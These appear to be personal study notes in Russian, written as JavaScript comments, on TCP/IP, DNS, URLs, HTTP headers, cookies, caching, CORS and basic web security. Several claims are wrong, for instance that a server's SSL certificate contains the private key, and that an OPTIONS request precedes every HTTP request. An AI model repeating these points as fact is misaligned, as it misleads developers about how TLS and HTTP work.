//!=============================================================================
// https://developer.mozilla.org/ru/docs/Learn/Common_questions
// https://www.scaler.com/topics/difference-between-internet-and-www/
// https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/Pages_sites_servers_and_search_engines
// https://www.youtube.com/watch?v=7_LPdttKXPc&ab_channel=Aaron
// https://www.youtube.com/watch?v=x3c1ih2NJEg&ab_channel=Lesics
// https://developer.mozilla.org/ru/docs/Learn/Common_questions/Web_mechanics/How_does_the_Internet_work
// https://habr.com/ru/companies/karuna/articles/568702/
//? /Internet/
//? Это сеть связанных между собой компьютеров
//? работает через протоколы TCP/IP

//? для связи машин между собой используют wifi/internet кабель





//?=============================================================================
//? /TCP/IP/ (Transmission Control Protocol/Internet Protocol) — это набор сетевых протоколов, который является основой для интернета и большинства современных компьютерных сетей. Он определяет, как данные должны передаваться между компьютерами и другими устройствами в сети. Основными компонентами TCP/IP являются два ключевых протокола — TCP и IP.



//? Основные компоненты:
//? IP (Internet Protocol):
//? Отвечает за маршрутизацию пакетов данных от отправителя к получателю. Делит данные на небольшие пакеты, каждый из которых содержит адрес источника и получателя. Версии: IPv4 (основная версия с 32-битными адресами) и IPv6 (новая версия с 128-битными адресами для увеличения количества возможных уникальных IP-адресов).



//? TCP (Transmission Control Protocol):
//? Обеспечивает надежную передачу данных. Контролирует, чтобы все пакеты прибыли в нужном порядке, и подтверждает получение данных. Выполняет перепосылку потерянных пакетов. Использует механизм управления потоком и проверку ошибок, что обеспечивает надежную связь. Принцип работы: TCP/IP делится на несколько уровней, каждый из которых выполняет определённые функции:



//? Уровень приложений (Application Layer):
//? Это уровень, где находятся такие протоколы, как HTTP (для веб-сайтов), FTP (для передачи файлов), SMTP (для электронной почты) и другие. Приложения на этом уровне взаимодействуют с пользователем.



//? Транспортный уровень (Transport Layer):
//? Обеспечивает передачу данных между приложениями на разных устройствах. Основные протоколы — это TCP (гарантированная доставка данных) и UDP (быстрая, но не гарантированная передача).



//? Сетевой уровень (Network Layer):
//? Этот уровень отвечает за доставку пакетов данных между узлами сети. Основной протокол — IP, который определяет, как пакеты данных направляются между сетями.



//? Канальный уровень (Link Layer):
//? Включает технологии для передачи данных на уровне физической сети, такие как Ethernet или Wi-Fi. Этот уровень работает с передачей пакетов по отдельным каналам связи.



//? Основные особенности /TCP/IP/:

//?     Надёжная доставка данных: TCP гарантирует, что все данные будут доставлены получателю без потерь. Если пакет теряется или повреждается в процессе передачи, TCP его повторно отправляет.
//? Грубо говоря работает так: например надо отправить 1500кб, сначала отправляются 500кб, получатель получает эту часть и отдает результат получен, затем отправляются следующие данные и тд, если в течении какого то времени клиент не ответил, что получил данные, они отправляются еще раз

//?     Упорядоченная передача: TCP гарантирует, что данные будут доставлены в том же порядке, в котором они были отправлены. Это особенно важно для приложений, где порядок данных имеет значение (например, для передачи файлов).

//?     Маршрутизация: IP-протокол определяет путь для передачи данных через сеть.

//?     Гибкость: TCP/IP поддерживает множество протоколов на уровне приложений, таких как HTTP, FTP, SMTP и другие.

//?     Масштабируемость: позволяет подключать миллионы устройств и пользователей, особенно с переходом на IPv6.

//?     Этот стек протоколов лежит в основе интернета, локальных сетей (LAN) и большинства других сетевых технологий.

//?     Дуплексное соединение: TCP поддерживает двунаправленную передачу данных, что означает, что данные могут передаваться в обоих направлениях (от клиента к серверу и обратно) одновременно.

//?     Трёхстороннее рукопожатие (three-way handshake), чтобы установить надёжное соединение. Этот процесс включает в себя обмен SYN, SYN-ACK, и ACK-сообщениями.
/*
**
***
****
*****/
//?=============================================================================
//? /router/
//? централизованный апарат - который раскидывает сообщения от компа к компу, тем самым все компы соединены с роутером, а он уже выступает в виде прослойки
//? создает сеть - если нужно связать несоколько сетей - использует больше роутеров между другими роутерами и тд


//? modem
//? устройство которое подключает нашу сеть к интернет-провайдеру, без него доступа в интернет не будет


//? internet-provider
//? компания, которая предоставляет нам интернет и она связана посредством сети с другими роутерами из других интернет компаний и тд
/*
**
***
****
*****/
//?=============================================================================
//? /IP/
//? уникальный адресс устройства в сети интернет(машинный адресс - для людей он хранится в преобразованном)



//? /Domain/Домен/
// https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_domain_name
//? человекочитаемый ip address
//? чтобы узнать, можно ли на домене зарегестрировать сайт - нужно проверить свободен ли домен



//? /DNS/
//? dns - система отвечающая за преобразование человека-читаемого адреса в ip (строки преобразуются в ip)
//? запрос -> из кэша берем ip этого сайта -> запрос на dns -> согласование запроса с сервером
/*
**
***
****
*****/
//!=============================================================================
//? /WEB/
//? Web - сеть связанных между собой сайтов с помощью интернета, работа с гипертекстом
//? работает через http/https


//? Основные столпы
//? HTTP/HTTPS
//? URL/Uniform Resource Locator - уникальный адрес ресурса, и всё. Может быть что угодно - html/css/video/и тд
//? HTML/hypertext - формат веб документов



//? web-page - html документ - уникальные пути внутри Domen'a   domain/path.html или domain/path2.html - 2 разные страницы
//? web-site - коллекция web-page - имеет уникальный Domen
//? web-server - место, где хранится ресурс
//? search-engine - поисковик сайтов (google, yandex, и тд)
//? browser - программа отображающая нам web-pages
//? web-client - инициатор запроса в основном браузер
//? hyperlink - ссылка на другую веб страницу
//? hyperText - текст позволяющий ссылаться на другие текста
/*
**
***
****
*****/
//!=============================================================================
//? /Protocol/Протокол/

//? протокол - единый подход к обмену данными
//? конкретно в вебе http может передавать hypertext, а благодоря расширяемости и video и тд


//? существуют разные:
//? data: ----- Data URLs
//? file: ----- Host-specific file names
//? ftp: ----- File Transfer Protocol
//? http/https: ----- Hyper text transfer protocol (Secure)
//? javascript: ----- URL-embedded JavaScript code
//? mailto: ----- Electronic mail address
//? ssh: ----- Secure shell
//? tel: ----- telephone
//? urn: ----- Uniform Resource Names
//? view: ----- source	Source code of the resource
//? ws: ----- wss WebSocket connections (Secure)
/*
**
***
****
*****/
//!=============================================================================
//? /HTTP/HTTPS/
// https://web.dev/articles/why-https-matters?hl=en
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP

//? http/https - hyper text transfer protocol протоколы позволяющие обмениваться данными

//? обмен данными без запоминания состояния

//? https использует соединение TCP с шифрованием SSL/TSL

//? расширяемый благодоря заголовкам - клиент сервер сами настраивают связь между собой

//? нет состояния - например аутентификации. Достигается это например с помощью cookie. Новый запрос ничего не знает о предыдущем, но можно с помощью заголовков настроить

//? позволяет кэшировать
/*
**
***
****
*****/
//? /Версии HTTP/:

//?     HTTP/1.0: Самая ранняя версия протокола, в которой каждый запрос открывал новое соединение. Не поддерживает многие современные функции, такие как сжатие данных и использование постоянных соединений.
//?     HTTP/1.1: Включает поддержку постоянных соединений (keep-alive), улучшенные методы кэширования, и сжатие заголовков.
//?     HTTP/2: Улучшение производительности за счёт мультиплексирования (несколько запросов могут выполняться по одному TCP-соединению одновременно), сжатия заголовков и бинарного протокола.
//?     HTTP/3: Использует протокол QUIC, который работает поверх UDP. Улучшена скорость передачи данных, особенно при высоких задержках и потерях пакетов.



//? Без https любой может прочитать перехватить соединение, никак данные не зашифрованы
/*
**
***
****
*****/
//? Как происходит запрос/Как работает браузер
//?     http запрос, тут же отправляется OPTIONS(браузер сам отправляет) запрос, чтобы получить что поддерживает сервер (безопасный запрос, он не меняет ничего)
//?     dns обработка
//?     TCP соединение (three-way handshake)
//?     браузер делает запрос на сервер, есть ли TLS/SSL
//?     сервер отдает SSL сертификат(в нем содержится и публичный и приватный ключи)
//?     браузер берет публичный ключ из SSL сертификата сервера, идет к центру сертификации подтвердить этот сертификат, затем браузер и сервер генерируют сессионный ключи, затем сервер отвечает успехом и соединение установлено
//?     proxies...
//?     отправка пакета данных и обратно подтверждение доставки и тд пока не будет переданы данные
//?     запрос на разрыв соединения и разрыв или использование соединения для дальнейших запросов
//?     DOM/CSSOM построение
//?     если был обнаружен скрипт без async/defer построение дерева останавливается
//?     компиляция js
//?     AOM(accessability object model)
//?     style/paint/flow/composite
//?     интерактивность
/*
**
***
****
*****/
//? /Client/
//? инициатор запроса

//? request запрос состоит из
//? http method - GET | PUT и тд
//? url
//? http version
//? headers
//? body



//? /Webserver/
// https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_web_server
//? устройство подключеннок к интернету и обрабатывает запросы
//? работает через http

//? response ответ состоит из
//? http version
//? response code (200, 404)
//? message
//? headers
//? body - если вообще ничего не нужно возврщать - обычно 201/204 код



//? /Proxy/
//? посредник в обработке запроса
//? например кэши, фильтрация и тд



//? /Сертификаты/Certificates/SSL/TSL/
//? /Secure Sockets Layer/Transport Layer Security/

//? шифруют данные для безопасного обмена между клиентом и сервером
//? у этого сертификата есть публичный(у клиента) и закрытый(у сервера) ключи, с помощью публичного браузер шифрует данные, с помощью закрытого сервер расшифровывает данные. Расшифровать то что закодировано публичным ключом можно только через закрытый

//?     браузер делает запрос на сервер, есть ли TLS/SSL
//?     сервер отдает SSL сертификат(в нем содержится и публичный и приватный ключи)
//?     браузер берет публичный ключ из SSL сертификата сервера, идет к центру сертификации подтвердить этот сертификат, затем браузер и сервер генерируют сессионный ключи, затем сервер отвечает успехом и соединение установлено
//?     все данные шифруются этим ключем
/*
**
***
****
*****/
//!=============================================================================
//? /Mime/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_Types
// https://www.iana.org/assignments/media-types/media-types.xhtml

//? отображает тип документа
//? браузеры не смотрят на расширении файла, они смотрят на то, какой mime у этого файла, если не указан, некоторые браузеры по своему будут пытаться распознать тип файла


//? type/subtype;parameter=value
//? text/html --- text/plain --- text/javascript
/*
**
***
****
*****/
//!=============================================================================
//? /URI/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web
//? все документы имеют uri - уникальный идентификатор ресурс

//? самый распространенный вид - это URL
/*
**
***
****
*****/
//!=============================================================================
//? /DatURI/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs

//? позволяет встраивать небольшие файлы в документ


//? data:[<mediatype>][;base64],<data>
//? data:text/html,%3Ch1%3EHello%2C%20World%21%3C%2Fh1%3E - html документ
/*
**
***
****
*****/
//!=============================================================================
//? /URL/
//? Абсолютный путь


//? структура
//? http://www.example.com:80/path/to/myfile.html?key1=value1&key2=value2#SomewhereInTheDocument

//? http:// - протокол

//? www.example.com - domain(ip address)

//? .com - TLD (домен верхнего уровня)

//? example - домен второго уровня SLD

//? www - поддомен, или третьего уровня

//? example.com - TLD+1

//? :80 - port (80 для HTTP и 443 для HTTPS)

//? path/to/myfile.html - путь до файла

//? ?key1=value1&key2=value2 - queryParams

//? #SomewhereInTheDocument - anchor
//? никогда не посылается на сервер в запросе - позволяет переходить к "закладкам на сайте"


//? Относительный путь
//? в html - когда мы ссылаемся на ресурс не указывая его полный путь - браузер начинает его искать относительно того, где мы находимся сейчас
/*
**
***
****
*****/
//!=============================================================================
//? /Headers/

//? Sec
//? начинающиеся с Sec не могут быть установлены через js, всегда устанавливаются браузером



//? X-Content-Type-Options
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
//? это маркер, используемый сервером для указания того, что типы MIME , объявленные в Content-Typeзаголовках, следует соблюдать и не изменять. Заголовок позволяет избежать перехвата типов MIME , сообщая, что типы MIME настроены намеренно.



//? X-XSS-Protection
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
/*
**
***
****
*****/
//?=============================================================================
//? /Shared/Общие/



//? Content-type
//? какой тип body отправляет на бэк или получается



//? Cache-Control
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control
//? управляет, как кэшировать запрос, для CDN, proxy, браузеров и тд

//? max-age - устанавливает сколько актуально кэшировать запрос по времени
//? s-maxage - для общих кэшей
//? no-cache - разрешает кэшировать, но требует от кэшей перепроверить ответ, перед использованием
//? must-revalidate - перепроверить
//? proxy-revalidate - для общих кешей
//? no-store - нельзя кэшировать воообще
//? private - хранить можно только в частном кэше
//? public - хранить в общих кэшах
//? must-understand - хранить кэш, если кэш понял, как его хранить(совокупность факторов)
//? no-transform - любой посредник не должен обрабатывать содержимое ответа
//? stale-while-revalidate - сколько запрос актуален, но даже после истечения можно отдавать его, главное кэшу сделать перезапрос в фоновом режиме
//? stale-if-error - можно отдавать старый кэш, если запрос падает с ошибкой (500, 502, 503, 504) только эти
//? min-fresh - хранить можно, если min-fresh удовлетворяет
//? immutable - ответ никогда не изменится

//? по умолчанию ставится no-cache
/*
**
***
****
*****/
//?=============================================================================
//? /Response/Ответы/
//? Access-Control-Allow-Origin
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin
//? заголовок ответа указывает может быть контент доступен для запрашивающего или нет
//?     - любой; будет игнорироваться, если credentials=true => запрос упадет
//? origin - для конкретного источника

//? для https://developer.mozilla.org origin мы установим https://developer.mozilla.org заголовк, чтобы ответ был ок, то есть origin должен быть потом равен заголовку


//? Vary
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary
//? ответ используется для создания ключа кэша, когда используется согласование содержимого(в нем передаются заголовки использовавшиеся для ответа)



//? Access-Control-Allow-Methods
//? ответ на OPTIONS какие методы можем использовать



//? Content-Security-Policy
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
//? защита от xxs атак, разрешить загружать данные из определенных источников (CSP)



//? Strict-Transport-Security
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
//? указывает, что сайт доступен только по https, браузер автоматически будет конвертировать в https последующие обращения к этому сайту



//? Access-Control-Expose-Headers
//? какие заголовки доступны для js в браузере на ответ из разных источников
//? изначально доступные только эти https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_response_header



//? Access-Control-Allow-Credentials
//? разрешает клиенту получать ответ или нет, если передаем credentials=include
//? если делается запрос credentials=true, то сервер должен вернуть этот заголовок иначе ответа от сервера не будет



//? Access-Control-Allow-Headers
//? ответ на OPTIONS какие заголовки мы можем отправлять



//? Access-Control-Max-Age
//? ответ на OPTIONS на сколько можно закешировать OPTIONS запрос, чтобы не гонять его постоянно



//? Timing-Allow-Origin
//? источники, которым можно видеть значения атрибутов из Resource timing API
// https://developer.mozilla.org/en-US/docs/Web/API/Performance_API/Resource_timing



//? Allow
//? то же что и Access-Control-Allow-Methods, но отсылается когда сделали неверный метод запроса и отправляем 405 ошибку



//? Set-Cookie
//? ответ сервера на установку заголовка, несколько раз нужно отправить, чтобы несколько установить
//? не установит ничего, если Access-Control-Allow-Origin=*



//? WWW-Authenticate
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate
//? какой метод аутентификации использовать можно, чтобы получить доступ к ресурсу, отдается с 401 ошибкой и должен включать хотя бы один метод



//? Content-Encoding
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Encoding
//? какой способ кодирования был использован сервером, чтобы браузер понял, ответ на Accept-Encoding



//? Content-Language
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Language
//? ответ на Accept-Language, но это не значит, что документ на ЭТОМ языке, это значит, что контент подходит для такой то аудитории, может содержать несколько языков
//? если мы хотим явно указать язык документа - то лучше использовать lang аттрибут на html



//? Accept-Ranges
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept-Ranges
//? поддерживает ли сервер запросы диапозона



//? Content-Length
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length
//? длина body в байтах



//? Content-Range
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Range
//? какая часть body от всего файла сейчас отправляется на клиент



//? Transfer-Encoding
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding
//? hop-by-hop заголовок сжатия



//? Permissions-Policy
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
//? какие вещи запретить браузеру, например audio/video/geolocation
/*
**
***
****
*****/
//?=============================================================================
//? /Request/Запросы/


//? Origin
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin
//? автоматически устанавливается. показывает кто делает запрос



//? Access-Control-Request-Method
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method
//? заголовок запроса отправляющийся в OPTIONS чтобы сказать серверу какой запрос будет выполняться



//? Access-Control-Request-Headers
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers
//? заголовок запроса в OPTIONS чтобы сказать какие заголовки отправляться будут и сервер узнает, сможет он обработать это или нет



//? Authorization
//? предоставляет данные для аутентификации и доступа к ресурсу



//? Cookie
//? отправка данных на сервер установленных ранее от сервера или через js



//? Accept
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation/List_of_default_Accept_values
//? Список mime типов, которые клиент может понять и обработать, а сервер выбирает и отдает нужный - при этом указывая в ответе Content-Type



//? Accept-Encoding
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept-Encoding
//? какая кодировка сжатия доступна на клиенте, а сервер отвечает и отдает Content-Encoding, какую он выбрал



//? Accept-Language
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept-Language
//? какой язык предпочитает клиент, отвечает сервер через Content-Language
//? фронту не желательно менять этот заголовок, потому что он создается автоматически браузером из предпочтений пользователя на основе операционной системы, а после получения например html - юзер пускай сам меняет язык на тот, который нужен



//? User-Agent
//? какой браузер на клиенте



//? Range
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range
//? какие части запроса сервер должен вернуть (Range requests)



//? Sec-Fetch-Site
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site
//? узнать какой тип запроса (samesite, crossite, sameorigin, crossorigin)
//? заголовок браузер устанавливает, через js нельзя
/*
**
***
****
*****/
//!=============================================================================
//? /Redirections/Перенаправление/
//? существует для поддержки сайта например на другом url, пока главный вариант на обслуживании, или перенаправление с http -> https
//? инициируется сервером на запрос с клиента, ответ начинается с 3.., а также имеет заголовок Location - url адресс для перенаправления, и как только браузер получает перенаправление - он немедленно загружает новый ресурс


//? бывают: постоянные, временные, специальные


//? все варианты перенаправление и их приоритет
//? http
//? window.location
//? <meta http-equiv="refresh" content="delay_time; URL=new_website_url" />


//? в случае циклических перенаправлений или множества их - выдается 500 ошибка
/*
**
***
****
*****/
//!=============================================================================
//? /Permissions Policy/Политика разрешение/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Permissions_Policy
//? что можно разрешать коду js выполнять в браузере(открыть iframe на весь экран, video/audio)


//? можно указать либо через Permissions-Policy/iframe allow
//? также можно включить "белые списки", кому разрешить что то


//? Это важно: по умолчанию, если <iframe> переходит к другому источнику, политика не применяется к источнику, к которому переходит <iframe>. Если указать источник, к которому переходит <iframe>, в атрибуте allow, политика разрешений, примененная к исходному <iframe>, будет применяется к источнику, к которому переходит <iframe>.
/*
**
***
****
*****/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
//!=============================================================================
//? /Compression/Сжатие/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Compression


//?=============================================================================
//? /End-to-end/Сквозное сжатие/
//? Сервер сжимает - клиент распаршивает данные


//? принцип работы
//? сервер отсылает на клиент "предзапрос TODO" https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation
//? браузер отправляет Accept-Encoding с поддерживающими типами сжатия
//? сервер выбирает один из и отправляет обратно Content-Encoding - выбранный сервером алгоритм сжатия

//? рекомендуется применять ко всему, кроме уже сжатых медиа файлов
/*
**
***
****
*****/
//?=============================================================================
//? /Hop-by-hop compression/Пошаговое сжатие/

//? Все то же самое, что и сквозное, только этим занимаются посредники, один зашифровывает, а другое более близкий клиенту - расшифровывает
//? настройка с помощью TE/Transfer-Encoding заголовков
/*
**
***
****
*****/
//!=============================================================================
//? /Content negotiation/Согласование содержимого/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation

//? Механизм, который используется, для обслуживания разных представлений ресурса по одному и тому же URI - то есть например, для пользователя может отдаваться страница на его языке, более предпочтительное изображение и тд


//? Благодоря заголовкам достигается это
//? клиент отправляет с запросом заголовки
//? сервер пытается подорбать подходящий контент по заголовкам и может вернуть 406/415 ошибки
//? сервер отдает контент и устанавливает в Vary те заголовки которые он использовал, чтобы кэши работали нормально


//? В основном используются Accept, Accept-Encoding, User-Agent и Accept-Language, Vary(с сервера отправляется для кэшей)
//? также можно использовать кастомные загловки, но тут проблема - чем больше заголовков, тем больше размер файла для отправки и тем больше "данных" о юзере, которые могут уйти "не туда куда нужно" (fingerprinting)
/*
**
***
****
*****/
//!=============================================================================
//? /Fingerprinting/Отпечатки пальцев/
// https://developer.mozilla.org/en-US/docs/Glossary/Fingerprinting
//? на основе заголовком, браузера и очень многих данных, можно составить "портер пользователя" и в дальнейшем его отслеживать в сети, как раз для этого слишком много заголовков передавать не стоит
/*
**
***
****
*****/
//!=============================================================================
//? /Cookie/Куки/
// https://developer.mozilla.org/ru/docs/Web/HTTP/Cookies
// https://learn.javascript.ru/cookie
// https://techcrunch.com/2020/05/06/no-cookie-consent-walls-and-no-scrolling-isnt-consent-says-eu-data-protection-body/?guccounter=1
// https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
//? это файл, отправляемый с клиента на сервер, для персонализации, сессий, отслеживания, отправляется с каждым запросом, кроме CORS
//? чтобы использовать только в https - Secure директива нужна

//? по умолчанию если нет SameSite, то он SameSite=Lax, или если SameSite=None, то должны быть куки переданы по Secure(Https)(иначе будет ошибка)



//? любой js файл на странице может получить доступ к ним(то есть мы можем встроить сторонний скрипт, который может получить куки, кроме httpOnly)



//? Бывают:
//? собственные - когда домен в куках и домен страницы совпадает

//? стороннние - когда нет, например сайт bank загружает картинку с сайта test, test устанавливает в запрос на картинку куки и они являются сторонними для сайта bank и отправляются только на запрос на сервер test
//? но что еще более важно, когда пользователь уйдет с bank на какой то другой сайт, но где ТАКЖЕ есть запрос на test - в браузере то куки уже хранятся, а значит другой сайт нас узнает как пользователя(так можно отслеживать пользователя)
//? например мы встроили на свой сайт видео с youtube, пользователь нашего сайта нажимает на кнопку "посмотреть позже", и магия, делается запрос на ютуб, и если пользователь там уже авторизован - куки будет подхвачено для этого запроса и будет передано на ютуб, то есть у нашего сайта будет стороннии куки от ютуба

//? Доступа к сторонним кукам нет вообще



//? Если мы загружаем скрипт со стороннего домена, например <script src="https://google-analytics.com/analytics.js">, и этот скрипт использует document.cookie, чтобы установить куки, то такое куки не является сторонним.
//? Если скрипт устанавливает куки, то нет разницы откуда был загружен скрипт – куки принадлежит домену текущей веб-страницы.



//? существуют
//? сеансовые куки - удаляются после завершения сеанса(при восстановлении вкладки - восстанавливаются и они тоже)
//? если нет ни Max-age/Expires - то они считаются сессиоными

//? постоянные - удаляются только при истечении Max-age/Expires аттрибутов


//? можно атаковать куки фиксацией сеанса и взять идентификатор(токен) пользователя и использовать его для запросов
// https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#session_fixation



//? ограничение по размеру и если он большой - каждый запрос будет медленнее
//? нет в webWorker/serviceWorker
//? только строки
//? для домена примерно 20+ записей в куках может содержаться, от браузера зависит
//? хранится ключ=значение;ключ=значение;
//? хранятся пока живет вкладка, если нет expires/max-age



//? document.cookie - чтение/запись(перезаписывать все не будет), это большая строка, которую нужно разбить, чтобы прочесть ключи


//?     Cookie - заголовок отправляет куки с запросом


//?     Set-Cookie - сервер говорит клиенту, чтобы заголовок установил

//?     cookieName=cookieValue

//?     httpOnly чтобы нельзя было получить доступ к куке через js

//?     Secure - только https/ssl

//?     Domain - где куки будут доступны (по умолчанию доступны куки тому домену, который их установил)

//?     Path - где по путям они будут доступны

//?     Partitioned - должны храниться в секцированном хранилище

//?     SameSite - отправляются ли они с межсайтовыми запросами(в старых браузерах не работает)
//? Lax - куки отправляются при переходе по ссылкам с других сайтов(были на test, переходим в bank, куки которые относятся к bank будут отправлены)
//? Strict - не будут отправляться вообще если разные домены
//? None - отправляются всегда, но обязателен Secure
/*
**
***
****
*****/
//!=============================================================================
//? /Range requests/Запросы диапозона/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests
//? Запрашивать части файлов на клиент, чтобы не загружать сразу весь файл
//? Например видеоплеер и тд

//? HEAD запрос с клиента
//? сервер отвечает accept-ranges, который не равен none - значит сервер поддерживаем диапозоны
//? клиент ranges отправляет - какой конкретно нужен диапозон
//? затем сервер отдает данные с заголовками content-length/content-range, а также код ответа 206(частичный контент)

//? если сервер не поддерживает вообще - просто отдает 200 и весь файл
//? если сервер были не те диапозоны с клиента - 416(неверный диапозон)
/*
**
***
****
*****/
//!=============================================================================
//? /HTTPCache/HTTPКэш/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching
//? Бывают 2 видов
//? Private - в основном кэш в браузере для конкретного пользователя
//? Shared - например кэш в прокси, и ответ используется один для нескольких пользователей


//? Управляется Cache-Control заголовком
/*
**
***
****
*****/
//!=============================================================================
//? /SameSite/Crossite/
// https://web.dev/articles/same-site-same-origin


//? Samesite это когда protocol.TLD+1 совпадают(используется это в куках в SameSite)

//? TLD+1 - это example.com в примере ниже
//? TLD - .com

//? https://www.example.com:443/foo, то «сайт» — это https://example.com
//? https://www.example.com:443 и https://логин.example.com:443 разные поддомены не имеют значения, поэтому это один и тот же сайт



//? Schemeless(безсхемовый) - еще считают одним и тем же сайтом, если совпадают только TLD+1



//? Чтобы узнать является запрос crossorigin/crosssite/sameorigin/samesite, браузер прикрепляет заголовок Sec-Fetch-Site.
/*
**
***
****
*****/
//!=============================================================================
//? /Authentication/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication

//? примерно как выглядит
//? запрос на сервер
//? ответ 401 + WWW-Authenticate(хотя бы одну схему для подтверждения пользователя доступную)
//? запрос с отсыланием Authorization - передача данных авторизации и схема


//? существуют разные схемы аутентификации (basic/bearer)
//? они отличаются по уровню безопасности и доступности в ПО
// https://www.iana.org/assignments/http-authschemes/http-authschemes.xhtml


//? например есть Basic - передаются закодированные userLogin/userPassword в base64 и все, то есть достаточно легко взломать и перехватить
/*
**
***
****
*****/
//!=============================================================================
//? /Same-origin/Cross-origin/Sameorigin/Crossorigin/CORS/Security/
// https://web.dev/articles/same-site-same-origin
// https://developer.mozilla.org/en-US/docs/Glossary/CORS
// https://aws.amazon.com/ru/what-is/cross-origin-resource-sharing/#:~:text=Cross%2Dorigin%20resource%20sharing%20(CORS,resources%20in%20a%20different%20domain.
// https://enable-cors.org/server.html
// https://httptoolkit.com/will-it-cors/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors
// https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
//? зарпещает доступ одних источников к другим, если они из разных источников

//? CORS система передачи заголовков, чтобы разрешить получать данные из разных источников (Same-origin policy), то есть если мы хотим получить данные из другого источника - сервер должен нам отдать заголовки разрешающие это сделать



//? same-origin: такие же protocol.domain(host).port
//? cross-origin остальные



//? какие запросы используют CORS - сложные
//? запросы считаются таковыми:
//?     методы отличные GET | POST | HEAD
//?     Заголовки, отличные от Accept-Language | Accept | Content-Language
//?     Заголовки Content-Type, отличные от multipart/form-data, application/x-www-form-urlencoded и text/plain


//? для сложных запросов будет сначала отправлен OPTIONS запрос, чтобы определить безопасно ли отправлять фактический запрос(браузер сам отправляет этот запрос)
//? Access-Control-Request-Method
//? Access-Control-Request-Headers



//? для безопасности, ошибки связанные с CORS нельзя через js проверить никак - только в консоли



//? по умолчанию браузеры не отправляют через fetch/XmlHttpRequest cookie, чтобы включить отправку - нужно withCredentials = true, но тогда и сервер должен установить
//? Access-Control-Allow-Origin: тут источник откуда был запрос на сервер
//? Access-Control-Allow-Credentials: true



//? хранилища, indexedDB, cookies - для каждого источника - свои



//? можно через js изменить domain через document.domain, но это устаревшее



//? есть ресусры которые можно встраивать из разных источников
//?     js
//?     css, но должен быть content-type верный
//?     img (но получать через js нельзя)
//?     video/audio
//?     iframe в зависимости от X-Frame-Options


//? 2 документа могут ссылаться друг на друга через iframe без ограничений если они из одного источника, iframe.contentWidnow, window.parent, window.opener, window.opener, документы из разных источников будут иметь ограниченный доступ по этим свойствам и могут общаться только через postMessage



//? Как происходит запрос:
//? Client request и отправляется Origin header
//? Server response и отправляет Access-Control-Allow-Origin header
//? Затем браузер видя Access-Control-Allow-Origin разрешает или блокирует ответ сервера для клиента
/*
**
***
****
*****/
//!=============================================================================
//? /WEBSECURITY/
//? /Check site/Проверить сайт на безопасноть/
// https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
// https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#session_fixation
// https://observatory.mozilla.org/
// https://infosec.mozilla.org/guidelines/web_security
// https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss
// https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage



//? всегда следует испрользовать https, банально потому, что многие функции(PWA) доступны только в https
//? не позволяет злоумышленникам прослушить взаимодействие с сервером или подменять что то
//? локальная разработка с https, нужна чтобы например тестировать некоторые функции которые доступны только в https
// https://web.dev/articles/when-to-use-local-https?hl=en



//? Strict-Transport-Security заголовок всегда нужно указывать



//? /Mixed content/Контент смешанный/
//? когда получаем сайт через https, но остальные ресурсы мы получаем через http - контент смешанный(mixed content)
//? разные браузеры по разному обрабатывают такой контент(chrome например mixed content в консоль предупреждение кладет для пассивного, а для активного - ошибку и не загружает его - ошибки в консоли найти можно)

